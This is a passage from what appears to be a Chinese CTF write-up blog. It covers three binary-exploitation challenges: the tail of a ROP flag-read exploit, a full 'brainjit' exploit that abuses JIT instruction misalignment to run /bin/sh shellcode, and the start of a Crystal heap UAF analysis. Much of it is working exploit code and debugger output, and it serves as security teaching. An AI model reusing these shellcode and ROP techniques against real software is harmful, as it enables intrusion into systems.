class="string">&quot;./sandbox.py&quot;</span>,challenge])</span><br><span class="line">    <span class="comment">#p = process(challenge)</span></span><br><span class="line">    <span class="comment">#p = gdb.debug(challenge, b)</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;34.123.210.162&#x27;</span>,<span class="string">&#x27;20234&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span>():</span></span><br><span class="line">    <span class="comment">#gdb.attach(p,&quot;b *0x401EF9\n&quot;)</span></span><br><span class="line">    gdb.attach(p,<span class="string">&quot;b *$rebase(0x1216)\n&quot;</span>)</span><br><span class="line">    pause()</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span>(<span class="params">op</span>):</span></span><br><span class="line">    sla(<span class="string">&quot;&gt;&quot;</span>,<span class="built_in">str</span>(op))</span><br><span class="line"></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">canary = <span class="number">0x6161616161616100</span></span><br><span class="line">pro_base = <span class="number">0x7fffb7dd6000</span></span><br><span class="line">libc_base = <span class="number">0x7fffb7ddb000</span></span><br><span class="line"></span><br><span class="line">pop_rax_ret = libc_base + <span class="number">0x0000000000036174</span></span><br><span class="line">pop_rdi_ret = libc_base + <span class="number">0x0000000000023b6a</span></span><br><span class="line">pop_rsi_ret = libc_base + <span class="number">0x000000000002601f</span></span><br><span class="line">pop_rdx_ret = libc_base + <span class="number">0x0000000000142c92</span></span><br><span class="line">syscall_ret = libc_base + <span class="number">0x000000000010db59</span></span><br><span class="line">mov_rdi_rax_ret = libc_base + <span class="number">0x000000000005b622</span></span><br><span class="line">pop_rcx_rbx_ret = libc_base + <span class="number">0x000000000010257e</span></span><br><span class="line">binsh_addr = libc_base + <span class="number">0x1b45bd</span></span><br><span class="line">bss_addr = pro_base + <span class="number">0x4010</span> + <span class="number">0x200</span></span><br><span class="line"></span><br><span class="line">payload =  <span class="string">&quot;a&quot;</span>*<span class="number">0x108</span>+p64(canary)+<span class="string">&quot;b&quot;</span>*<span class="number">0x8</span></span><br><span class="line">payload += p64(pop_rax_ret)+p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rdi_ret)+p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rsi_ret)+p64(bss_addr)</span><br><span class="line">payload += p64(pop_rdx_ret)+p64(<span class="number">0x30</span>)</span><br><span class="line">payload += p64(syscall_ret) <span class="comment"># read </span></span><br><span class="line">payload += p64(pop_rax_ret)+p64(<span class="number">2</span>) </span><br><span class="line">payload += p64(pop_rdi_ret)+p64(bss_addr)</span><br><span class="line">payload += p64(pop_rsi_ret)+p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rdx_ret)+p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(syscall_ret) <span class="comment"># open</span></span><br><span class="line">payload += p64(pop_rcx_rbx_ret)+p64(<span class="number">0x100</span>)+p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(mov_rdi_rax_ret)</span><br><span class="line">payload += p64(pop_rsi_ret)+p64(bss_addr)</span><br><span class="line">payload += p64(pop_rdx_ret)+p64(<span class="number">0x30</span>)</span><br><span class="line">payload += p64(pop_rax_ret)+p64(<span class="number">0</span>) </span><br><span class="line">payload += p64(syscall_ret) <span class="comment"># read</span></span><br><span class="line">payload += p64(pop_rax_ret)+p64(<span class="number">1</span>) </span><br><span class="line">payload += p64(pop_rdi_ret)+p64(<span class="number">1</span>)</span><br><span class="line">payload += p64(pop_rsi_ret)+p64(bss_addr)</span><br><span class="line">payload += p64(pop_rdx_ret)+p64(<span class="number">0x30</span>)</span><br><span class="line">payload += p64(syscall_ret) <span class="comment"># write</span></span><br><span class="line">payload += p64(pop_rax_ret)+p64(<span class="number">60</span>) </span><br><span class="line">payload += p64(pop_rdi_ret)+p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(syscall_ret) <span class="comment"># exit</span></span><br><span class="line"></span><br><span class="line">sla(<span class="string">&quot;something&quot;</span>,payload)</span><br><span class="line">p.send(<span class="string">&quot;flag&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="brainjit"><a href="#brainjit" class="headerlink" title="brainjit"></a>brainjit</h2><p>这是一个 python 程序：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Brainf*ck code: &quot;</span>, end=<span class="string">&quot;&quot;</span>, flush=<span class="literal">True</span>)</span><br><span class="line">    code = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x8000</span>):</span><br><span class="line">        c = sys.stdin.read(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">if</span> c == <span class="string">&#x27;\n&#x27;</span>: <span class="keyword">break</span></span><br><span class="line">        code += c</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">raise</span> MemoryError(<span class="string">&quot;Code must be less than 0x8000 bytes.&quot;</span>)</span><br><span class="line"></span><br><span class="line">    signal.alarm(<span class="number">15</span>)</span><br><span class="line">    jit = BrainJIT(code)</span><br><span class="line">    jit.<span class="built_in">compile</span>()</span><br><span class="line">    jit.run()</span><br></pre></td></tr></table></figure>
<ul>
<li>这是一个 Brainfuck 语言的解释器</li>
</ul>
<p>Brainfuck 的8种符号如下：</p>
<div class="table-container">
<table>
<thead>
<tr>
<th>符号</th>
<th>含义</th>
</tr>
</thead>
<tbody>
<tr>
<td>&gt;</td>
<td>pointer ++</td>
</tr>
<tr>
<td>&lt;</td>
<td>pointer —</td>
</tr>
<tr>
<td>+</td>
<td>*(pointer) ++</td>
</tr>
<tr>
<td>-</td>
<td>*(pointer) —</td>
</tr>
<tr>
<td>.</td>
<td>output(pointer)</td>
</tr>
<tr>
<td>,</td>
<td>input(pointer)</td>
</tr>
<tr>
<td>[</td>
<td>while (*pointer) {</td>
</tr>
<tr>
<td>]</td>
<td>}</td>
</tr>
</tbody>
</table>
</div>
<p><strong>漏洞分析</strong></p>
<p>该程序就是先将 Brainfuck 语言解释为二进制代码，然后利用如下代码进行执行：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run</span>(<span class="params">self</span>):</span></span><br><span class="line">    ctypes.CFUNCTYPE(ctypes.c_int, *<span class="built_in">tuple</span>())( </span><br><span class="line">        ctypes.addressof(ctypes.c_int.from_buffer(self._code))</span><br><span class="line">    )()</span><br></pre></td></tr></table></figure>
<ul>
<li>代码的主要目的是将一个整数类型的地址（通过 <code>ctypes.addressof()</code> 获取）传递给回调函数，该整数类型表示一个字节字符串 </li>
<li>ctypes.CFUNCTYPE：表示一个接受任意数量的参数（包括可选参数）的函数类型</li>
</ul>
<p>漏洞点如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">elif</span> insn == <span class="string">&#x27;[&#x27;</span>:</span><br><span class="line">    <span class="comment"># mov al, byte ptr [rbp+rbx]</span></span><br><span class="line">    <span class="comment"># test al, al</span></span><br><span class="line">    <span class="comment"># jz ??? (address will be fixed later)</span></span><br><span class="line">    emit += <span class="string">b&#x27;\x42\x8a\x44\x05\x00\x84\xc0&#x27;</span></span><br><span class="line">    emit += <span class="string">b&#x27;\x0f\x84&#x27;</span> + p32(-<span class="number">1</span>)</span><br><span class="line">    jumps.append(self._code_len + <span class="built_in">len</span>(emit))</span><br></pre></td></tr></table></figure>
<ul>
<li>如果只设置 <code>[</code> 而不设置 <code>]</code> 就会导致指令错位</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">   <span class="number">0x7f9cb48cb04d</span>    mov    al, byte ptr [rbp + r8]</span><br><span class="line">   <span class="number">0x7f9cb48cb052</span>    test   al, al</span><br><span class="line"> ► <span class="number">0x7f9cb48cb054</span>  ✔ je     <span class="number">7f</span>9cb48cb059h                 &lt;<span class="number">0x7f9cb48cb059</span>&gt;</span><br><span class="line">    ↓</span><br><span class="line">   <span class="number">0x7f9cb48cb059</span>    dec    dword ptr [rcx - <span class="number">7f</span>h]</span><br><span class="line">------------------------------------------------------</span><br><span class="line">   <span class="number">0x7f69c146504d</span>    mov    al, byte ptr [rbp + r8]</span><br><span class="line">   <span class="number">0x7f69c1465052</span>    test   al, al</span><br><span class="line"> ► <span class="number">0x7f69c1465054</span>  ✔ je     <span class="number">7f</span>69c1465078h                 &lt;<span class="number">0x7f69c1465078</span>&gt;</span><br><span class="line">    ↓</span><br><span class="line">   <span class="number">0x7f69c1465078</span>    pop    rbp</span><br></pre></td></tr></table></figure>
<p><strong>入侵思路</strong></p>
<p>先关闭地址随机化，二进制代码起始地址为 0x7ffff7a91000，写入数据的基地址为 0x7ffff7e2c000</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># int3</span></span><br><span class="line"><span class="comment"># push r8</span></span><br><span class="line"><span class="comment"># push rbp</span></span><br><span class="line"><span class="comment"># xor ebx, ebx</span></span><br><span class="line"><span class="comment"># mov rbp, addr_mem</span></span><br><span class="line">emit_enter = <span class="string">b&#x27;\x72\x01\xcc&#x27;</span> + <span class="string">b&#x27;\x41\x50\x55\x45\x31\xc0\x48\xbd&#x27;</span> + p64(addr_mem)</span><br></pre></td></tr></table></figure>
<ul>
<li>调试前先在 <code>emit_enter</code> 之前加一个 <code>int3</code>，每次调试时都会在这里进行断点</li>
</ul>
<p>指令错位可以在预期指令前添加一个 <code>\xff</code>：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">code = <span class="string">&#x27;[+&#x27;</span> + <span class="string">&#x27;&gt;&#x27;</span> * <span class="number">0x5558</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">  <span class="number">0x7ffff7a91013</span>    mov    al, byte ptr [rbp + r8]</span><br><span class="line">  <span class="number">0x7ffff7a91018</span>    test   al, al</span><br><span class="line">  <span class="number">0x7ffff7a9101a</span>    je     <span class="number">7f</span>fff7a9101fh                 &lt;<span class="number">0x7ffff7a9101f</span>&gt;</span><br><span class="line">   ↓</span><br><span class="line">► <span class="number">0x7ffff7a9101f</span>    inc    dword ptr [rdx - <span class="number">2</span>]</span><br><span class="line">  <span class="number">0x7ffff7a91022</span>    add    eax, <span class="number">0</span>c0814900h</span><br><span class="line">  <span class="number">0x7ffff7a91028</span>    pop    rax</span><br><span class="line">  <span class="number">0x7ffff7a91029</span>    push   rbp</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">20</span>xg <span class="number">0x7ffff7a9101f</span></span><br><span class="line"><span class="number">0x7ffff7a9101f</span>:	<span class="number">0x8149000544fe42ff</span>	<span class="number">0xf8814900005558c0</span></span><br><span class="line"><span class="number">0x7ffff7a9102f</span>:	<span class="number">0x5dcc017200008000</span>	<span class="number">0x0000000000c35841</span></span><br></pre></td></tr></table></figure>
<ul>
<li>这一字节的错位就可以让我们执行两字节的指令 <code>pop rax; push rbp;</code></li>
<li>核心目的就是为了使栈顶指针指向 <code>rbp</code>，而 <code>pop rax</code> 是为了防止后续出现段错误</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">RBP  <span class="number">0x7ffff7e2c000</span> ◂— <span class="number">0</span></span><br><span class="line">RSP  <span class="number">0x7fffffffd418</span> —▸ <span class="number">0x7fffffffd430</span> ◂— <span class="number">0x6</span></span><br></pre></td></tr></table></figure>
<ul>
<li>由于 <code>rbp</code> 正好指向我们的数据区，如果在这里写入 shellcode 就可以在 <code>ret</code> 指令跳转时执行 shellcode（至于 <code>ret</code> 指令，还是可以用同样的方法写入）</li>
</ul>
<p>于是入侵的步骤为：</p>
<ul>
<li>利用指令错位构造 <code>pop rax; push rbp;</code></li>
<li>在 0x7ffff7e2c000 中写入 shellcode</li>
<li>利用指令错位构造 <code>ret;</code></li>
</ul>
<p>完整 exp 如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">arch = <span class="number">64</span></span><br><span class="line">challenge = <span class="string">&#x27;./app.py&#x27;</span></span><br><span class="line"></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">64</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">32</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#elf = ELF(challenge)</span></span><br><span class="line"><span class="comment">#libc = ELF(&#x27;libc-2.31.so&#x27;)</span></span><br><span class="line"></span><br><span class="line">rl = <span class="keyword">lambda</span>    a=<span class="literal">False</span>        : p.recvline(a)</span><br><span class="line">ru = <span class="keyword">lambda</span> a,b=<span class="literal">True</span>    : p.recvuntil(a,b)</span><br><span class="line">rn = <span class="keyword">lambda</span> x            : p.recvn(x)</span><br><span class="line">sn = <span class="keyword">lambda</span> x            : p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x            : p.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> a,b            : p.sendafter(a,b)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b        : p.sendlineafter(a,b)</span><br><span class="line">irt = <span class="keyword">lambda</span>            : p.interactive()</span><br><span class="line">dbg = <span class="keyword">lambda</span> text=<span class="literal">None</span>  : gdb.attach(p, text)</span><br><span class="line"><span class="comment"># lg = lambda s,addr        : log.info(&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27; % (s,addr))</span></span><br><span class="line">lg = <span class="keyword">lambda</span> s            : log.info(<span class="string">&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27;</span> % (s, <span class="built_in">eval</span>(s)))</span><br><span class="line">uu32 = <span class="keyword">lambda</span> data        : u32(data.ljust(<span class="number">4</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> data        : u64(data.ljust(<span class="number">8</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">b = <span class="string">&quot;set debug-file-directory ./.debug/\n&quot;</span></span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process(challenge)</span><br><span class="line">    <span class="comment">#p = gdb.debug(challenge, b)</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;119.13.105.35&#x27;</span>,<span class="string">&#x27;10111&#x27;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span>():</span></span><br><span class="line">    gdb.attach(p,<span class="string">&quot;&quot;</span>)</span><br><span class="line">    <span class="comment">#gdb.attach(p,&quot;b *$rebase()\n&quot;)</span></span><br><span class="line">    pause()</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span>(<span class="params">op</span>):</span></span><br><span class="line">    sla(<span class="string">&quot;&gt;&quot;</span>,<span class="built_in">str</span>(op))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cshellcode</span>(<span class="params">code</span>):</span></span><br><span class="line">    re = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> code:</span><br><span class="line">        re += <span class="string">&quot;+&quot;</span>*i</span><br><span class="line">        re += <span class="string">&quot;&gt;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> re</span><br><span class="line"></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">b&quot;\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05&quot;</span></span><br><span class="line"></span><br><span class="line">payload =  <span class="string">&quot;[+&quot;</span> + <span class="string">&quot;&gt;&quot;</span>*<span class="number">0x5558</span></span><br><span class="line">payload += cshellcode(shellcode)</span><br><span class="line">payload += <span class="string">&quot;[+&quot;</span> + <span class="string">&quot;&gt;&quot;</span>*<span class="number">0xc3</span></span><br><span class="line"></span><br><span class="line">sla(<span class="string">&quot;Brainf*ck code:&quot;</span>,payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="wise"><a href="#wise" class="headerlink" title="wise"></a>wise</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">GNU C <span class="title">Library</span> <span class="params">(Ubuntu GLIBC <span class="number">2.35</span><span class="number">-0u</span>buntu3<span class="number">.4</span>)</span> stable release version 2.35.</span></span><br></pre></td></tr></table></figure>
<p>先安装必要的库：（在 Dockerfile 中看的）</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get -y install libevent-dev </span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">spy: ELF <span class="number">64</span>-bit LSB pie executable, x86<span class="number">-64</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span>, BuildID[sha1]=<span class="number">90e12</span>ec5d3d303671f6f0581af22bad63082f0e1, <span class="keyword">for</span> GNU/Linux <span class="number">3.2</span><span class="number">.0</span>, with debug_info, <span class="keyword">not</span> stripped</span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
<ul>
<li>64位，dynamically，Full RELRO，NX，PIE</li>
</ul>
<p>在 IDA 中发现如下字符串：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.rodata:<span class="number">00000000001046F</span>C <span class="number">20</span> <span class="number">74</span> <span class="number">6F</span> <span class="number">20</span> <span class="number">28</span> <span class="number">55</span> <span class="number">49</span> <span class="number">6</span>E <span class="number">74</span> <span class="number">33</span>+aToUint32Uint64 db <span class="string">&#x27; to (UInt32 | UInt64) failed, at /home/ptr/app/crystal/share/crystal/src/exception/call_stack/d&#x27;</span></span><br><span class="line">.rodata:<span class="number">00000000001046F</span>C <span class="number">32</span> <span class="number">20</span> <span class="number">7</span>C <span class="number">20</span> <span class="number">55</span> <span class="number">49</span> <span class="number">6</span>E <span class="number">74</span> <span class="number">36</span> <span class="number">34</span>+db <span class="string">&#x27;warf.cr:56:40:56&#x27;</span>,<span class="number">0</span></span><br></pre></td></tr></table></figure>
<ul>
<li>定位到 github 项目：<a target="_blank" rel="noopener" href="https://github.com/crystal-lang/crystal">crystal-lang/crystal: The Crystal Programming Language (github.com)</a> </li>
</ul>
<p><strong>crystal-lang</strong></p>
<p>Crystal 是一种基于 LLVM 的可编译静态类型编程语言，用于编写高性能、可扩展的程序</p>
<p>在 ubuntu 上的安装教程如下：<a target="_blank" rel="noopener" href="https://crystal-lang.org/install/on_ubuntu/">Install On Ubuntu - The Crystal Programming Language (crystal-lang.org)</a> </p>
<p>测试样例：</p>
<figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># server.cr</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&quot;socket&quot;</span></span><br><span class="line"></span><br><span class="line">server = TCPServer.new(<span class="number">8080</span>)</span><br><span class="line">loop <span class="keyword">do</span></span><br><span class="line"> client = server.accept</span><br><span class="line"> client.puts <span class="string">&quot;Hello, world!&quot;</span></span><br><span class="line"> client.close</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>
<ul>
<li>Crystal 的语法可以参考如下博客：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/otakus/p/learncrystal-lang.html">crystal-lang入门(一）</a> </li>
</ul>
<p>进行编译：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crystal build main.cr</span><br></pre></td></tr></table></figure>
<ul>
<li>对编译好的文件进行逆向分析，发现与题目文件高度相似</li>
</ul>
<p><strong>漏洞分析</strong></p>
<p>程序提供了如下功能：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span> Add <span class="keyword">new</span> citizen <span class="comment">/* malloc chunk */</span></span><br><span class="line"><span class="number">2.</span> Update personal information <span class="comment">/* edit chunk */</span></span><br><span class="line"><span class="number">3.</span> Print <span class="built_in">list</span> of citizen <span class="comment">/* show chunk */</span></span><br><span class="line"><span class="number">4.</span> Mark as spy <span class="comment">/* store chunk */</span></span><br><span class="line"><span class="number">5.</span> Give memorable ID to spy <span class="comment">/* edit store chunk */</span></span><br><span class="line"><span class="number">6.</span> Print information of spy <span class="comment">/* show store chunk */</span></span><br></pre></td></tr></table></figure>
<ul>
<li>功能4可以将目标 chunk 的存放入栈中</li>
</ul>
<p>漏洞点就是：放入栈中保存的数据可能因为某种原因被释放，导致 UAF</p>
<p><strong>分析程序</strong></p>
<p>本题目的堆风水比较复杂（crystal 应该是使用 GC 来管理堆内存）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">id = add(b<span class="string">&quot;a&quot;</span>*<span class="number">4</span>)</span><br><span class="line"><span class="keyword">for</span> i in range(<span class="number">3</span>):</span><br><span class="line">    add(chr(i+<span class="number">0x30</span>)*<span class="number">4</span>)</span><br></pre></td></tr></table></figure>
<ul>
<li>crystal 的堆是向上填充的（使用 mmap 创建堆空间）</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>c:<span class="number">00e0</span>│  <span class="number">0x7ffff7cd1f20</span> ◂— <span class="number">0x400000001</span> </span><br><span class="line"><span class="number">1</span>d:<span class="number">00e8</span>│  <span class="number">0x7ffff7cd1f28</span> ◂— <span class="number">0x3232323200000000</span> <span class="comment">/* 2222 */</span></span><br><span class="line"><span class="number">1</span>e:<span class="number">00f</span>0│  <span class="number">0x7ffff7cd1f30</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">1f</span>:<span class="number">00f</span>8│  <span class="number">0x7ffff7cd1f38</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">20</span>:<span class="number">0100</span>│  <span class="number">0x7ffff7cd1f40</span> ◂— <span class="number">0x400000001</span></span><br><span class="line"><span class="number">21</span>:<span class="number">0108</span>│  <span class="number">0x7ffff7cd1f48</span> ◂— <span class="number">0x3131313100000000</span> <span class="comment">/* 1111 */</span></span><br><span class="line"><span class="number">22</span>:<span class="number">0110</span>│  <span class="number">0x7ffff7cd1f50</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">23</span>:<span class="number">0118</span>│  <span class="number">0x7ffff7cd1f58</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">24</span>:<span class="number">0120</span>│  <span class="number">0x7ffff7cd1f60</span> ◂— <span class="number">0x400000001</span></span><br><span class="line"><span class="number">25</span>:<span class="number">0128</span>│  <span class="number">0x7ffff7cd1f68</span> ◂— <span class="number">0x3030303000000000</span> <span class="comment">/* 0000 */</span></span><br><span class="line"><span class="number">26</span>:<span class="number">0130</span>│  <span class="number">0x7ffff7cd1f70</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">27</span>:<span class="number">0138</span>│  <span class="number">0x7ffff7cd1f78</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">28</span>:<span class="number">0140</span>│  <span class="number">0x7ffff7cd1f80</span> —▸ <span class="number">0x7ffff7cd1f00</span> —▸ <span class="number">0x7ffff7cd1ee0</span> —▸ <span class="number">0x7ffff7cd1ec0</span> —▸ <span class="number">0x7ffff7cd1ea0</span> ◂— ... <span class="comment">/* free chunk */</span></span><br><span class="line"><span class="number">29</span>:<span class="number">0148</span>│  <span class="number">0x7ffff7cd1f88</span> ◂— <span class="number">0x429aa2b3a5215326</span></span><br><span class="line"><span class="number">2</span>a:<span class="number">0150</span>│  <span class="number">0x7ffff7cd1f90</span> ◂— <span class="number">0x4cd694ac191266b9</span></span><br><span class="line"><span class="number">2b</span>:<span class="number">0158</span>│  <span class="number">0x7ffff7cd1f98</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">2</span>c:<span class="number">0160</span>│  <span class="number">0x7ffff7cd1fa0</span> ◂— <span class="number">0x400000001</span></span><br><span class="line"><span class="number">2</span>d:<span class="number">0168</span>│  <span class="number">0x7ffff7cd1fa8</span> ◂— <span class="number">0x6161616100000000</span> <span class="comment">/* aaaa */</span></span><br><span class="line"><span class="number">2</span>e:<span class="number">0170</span>│  <span class="number">0x7ffff7cd1fb0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">2f</span>:<span class="number">0178</span>│  <span class="number">0x7ffff7cd1fb8</span> ◂— <span class="number">0x0</span></span><br></pre></td></tr></table></figure>
<p>程序中关键的结构如下：</p>
